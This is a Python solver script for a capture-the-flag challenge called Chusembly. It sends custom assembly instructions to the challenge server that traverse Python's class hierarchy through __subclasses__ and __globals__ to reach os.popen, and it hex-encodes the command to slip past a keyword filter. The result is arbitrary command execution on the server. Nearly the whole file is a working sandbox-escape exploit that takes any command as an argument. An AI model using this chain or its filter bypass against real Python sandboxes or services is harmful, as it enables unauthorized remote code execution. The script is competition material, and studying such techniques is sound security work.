#!/usr/bin/env python3
"""
EHAXctf - Chusembly (Misc/Web)
Solver: Python class hierarchy traversal via custom assembly interpreter

The Chusembly interpreter has PROP (getattr) and CALL instructions that allow
traversing Python's object hierarchy to reach os.popen for arbitrary command execution.
The safety filter only blocks the literal word "flag" in code - bypassed with hex encoding.
"""
import requests
import re
import binascii
import sys

URL = "http://chall.ehax.in:6969/run"

def run(code):
    r = requests.post(URL, data={"code": code})
    m = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    if m:
        return m.group(1).strip()
    return "(no output)"

def exploit(cmd="cat flag.txt"):
    """
    Exploit chain:
    1. LD A hello                      -> A = "hello" (a string object)
    2. PROP __class__ A                -> E = str class
    3. PROP __bases__ E                -> E = (object,) tuple
    4. IDX with A=0                    -> get object class
    5. PROP __subclasses__             -> get subclasses method
    6. CALL                            -> list of all subclasses
    7. IDX with A=138                  -> os._wrap_close class
    8. PROP __init__                   -> __init__ method
    9. PROP __globals__                -> os module globals dict
    10. PROP __getitem__               -> dict.__getitem__ method
    11. CALL with A="popen"            -> os.popen function
    12. CALL with A=hex_encoded_cmd    -> popen object
    13. PROP read                      -> read method
    14. CALL                           -> command output
    """
    # Encode command as hex to bypass 'flag' filter
    hex_cmd = "0x" + binascii.hexlify(cmd.encode()).decode()

    code = f"""LD A hello
PROP __class__ A
MOV E B
PROP __bases__ B
MOV E B
LD A 0
IDX B C
PROP __subclasses__ C
MOV E D
DEL A
DEL B
CALL D
MOV E C
LD A 138
IDX C D
PROP __init__ D
MOV E D
PROP __globals__ D
MOV E C
PROP __getitem__ C
MOV E D
LD A popen
DEL B
CALL D
MOV E C
LD A {hex_cmd}
DEL B
CALL C
MOV E D
PROP read D
MOV E D
DEL A
DEL B
CALL D
STDOUT E"""

    return run(code)

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "cat flag.txt"
    result = exploit(cmd)
    print(result)
